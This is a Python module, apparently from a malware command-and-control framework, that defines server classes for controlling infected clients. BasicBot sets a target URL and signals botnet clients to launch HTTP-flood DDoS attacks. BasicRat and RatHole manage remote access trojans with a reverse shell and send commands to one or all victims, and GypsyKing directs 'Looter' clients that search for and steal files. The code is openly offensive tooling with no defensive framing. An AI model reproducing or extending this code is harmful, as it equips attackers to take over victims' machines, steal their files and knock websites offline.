from time import sleep

from .basic_templates import BasicTemplate
from .adv_templates import AdvTemplate
from .controlers import BotControler


class Basic(BasicTemplate):
    TYPES = "Basic"
    INFO = "Basic Test Server"
    WORM_TYPE = "BasicWorm"
    WORM_INFO = "Empty Worm"

    def __init__(self, main_pipe, conf, signal_stop):
        super().__init__(main_pipe, conf, signal_stop)

class Echo(BasicTemplate):
    TYPES = "Echo"
    INFO = "Simple Echo Server. Recive message and send response."
    WORM_TYPE = "EchoClient"
    WORM_INFO = "Echo client connect to server, send 'hello world' message, recive response"

    def __init__(self, main_pipe, conf, signal_stop):
        super().__init__(main_pipe, conf, signal_stop)
    
    def accept_conn(self, handler):
        pass

class BasicBot(BasicTemplate):
    TYPES = "BasicBot"
    INFO = "Basic Botnet Server. Can handle mulitple botnet clients. Can set auto target and signal to attack."
    WORM_TYPE = "BasicBotnet"
    WORM_INFO = "Botnet Client can perform DDOS Attack (Http_Flood). Clients automatic recive target url from server and signal to attack"

    def __init__(self, main_pipe, conf, signal_stop):
        super().__init__(main_pipe, conf, signal_stop, controler=BotControler)
        self.target = None
        self.start_attack = False
    
    def accept_conn(self, handler):
        pass
    
    def set_target(self, target):
        self.target = target
        self.send_msg(f"tar {target}", "ALL")
        self.Msg(f"\n[{self.name}] Target was set !! Send command to all clients", level=True)
        return True
    
    def signal_attack(self):
        if not self.target:
            self.Msg(f"\n[{self.name}] [!!] ERROR: No target [!!]", level=True)
            return False
        self.start_attack = True
        self.send_msg("att", "ALL")
        return True
    
    def stop_attack(self):
        self.start_attack = False
        self.send_msg("stp", "ALL")

    def send_coordinates(self, handler):
        if self.target:
            self.send_msg(f"tar {self.target}", handler)
            sleep(0.2)
        if self.start_attack:
            self.send_msg("att", handler)
        
    
    def exec_sys(self, msg, handler):
        cmd = self.unpack_sys(msg)
        self.Msg(f"[{self.name}-DEV] EXEC_SYS:{cmd}", dev=True)
        if cmd[0] == "basbot":
            self.send_coordinates(handler)
            return True
        self._exec_sys(msg, handler)

class BasicRat(BasicTemplate):
    TYPES = "BasicRat"
    INFO = "Server to handle multiple Simple RAT clients."
    WORM_TYPE = "BasicRat"
    WORM_INFO = "Runs in background. Include reverse Shell"

    def __init__(self, main_pipe, conf, signal_stop):
        super().__init__(main_pipe, conf, signal_stop)
    
    def accept_conn(self, handler):
        pass

    def help(self):
        hilfe = "\n ---------------------- BasicRat Server Command ------------------\n"
        hilfe += '---   ss "@<client_id> pwd            - Shows the current directory\n'
        hilfe += '---   ss "@<client_id> cd <dir_name>  - Change Directory\n'
        hilfe += '---   ss "@<client_id> <shell_cmd>    - Send Shell command and recive response\n'
        hilfe += '--- ex:\n'
        hilfe += '---   ss "@1 cd c:/windows"           - Change directory in client no1\n'
        hilfe += '---   ss "@3 ipconfig"                - Send Shell command "ipconfig" to client no3\n'
        hilfe += '---   ss "@ALL ipconfig"              - Send Shell command "ipconfig" to all clients\n'
        return hilfe

class GypsyKing(AdvTemplate):
    TYPES = "GypsyKing"
    INFO = "Server to handle multiple Looter connection. Download and send files."
    WORM_TYPE = "Looter"
    WORM_INFO = "Runs in background. Search and Robs files from client. Also can manualy send and download files"

    def __init__(self, main_pipe, conf, signal_stop):
        super().__init__(main_pipe, conf, signal_stop)
    
    @property
    def conf(self):
        config = self.show_config()
        config["SYS_MSG"] = self.sys_msg
        config["LOOTER_DIR"] = self.load_data_file("looter.txt")
        config["LOOTER_EXT"] = self.load_data_file("looter_ext.txt")
        return config
    
    def accept_conn(self, handler):
        pass

    def help(self):
        hilfe = "\n --------------------------- Looter Client Command ----------------------\n"
        hilfe += '---   ss "@<client_id> dir"           - Show dirs and files current dir\n'
        hilfe += '---   ex: ss "@3 dir"\n\n'
        hilfe += '---   ss "@<client_id> pwd"           - Shows the current directory\n'
        hilfe += '---   ss "@<client_id> cd <dir_name>" - Change directory\n'
        hilfe += '---   ex: ss "@1 cd c:/windows"\n'
        return hilfe


class RatHole(AdvTemplate):
    TYPES = "RatHole"
    INFO = "Server to handle multiple Advanced Rats."
    WORM_TYPE = "Rat"
    WORM_INFO = "Runs in background. Include many function"

    def __init__(self, main_pipe, conf, signal_stop):
        super().__init__(main_pipe, conf, signal_stop)
    
    
    def accept_conn(self, handler):
        pass

    def help(self):
        hilfe = "\n --------------------------- RAT Client Command ----------------------\n"
        hilfe += '---   ss "@<client_id> dir"           - Show dirs and files current dir\n'
        hilfe += '---   ex: ss "@3 dir"\n\n'
        hilfe += '---   ss "@<client_id> pwd"           - Shows the current directory\n'
        hilfe += '---   ss "@<client_id> cd <dir_name>" - Change directory\n'
        hilfe += '---   ex: ss "@1 cd c:/windows"\n'
        return hilfe
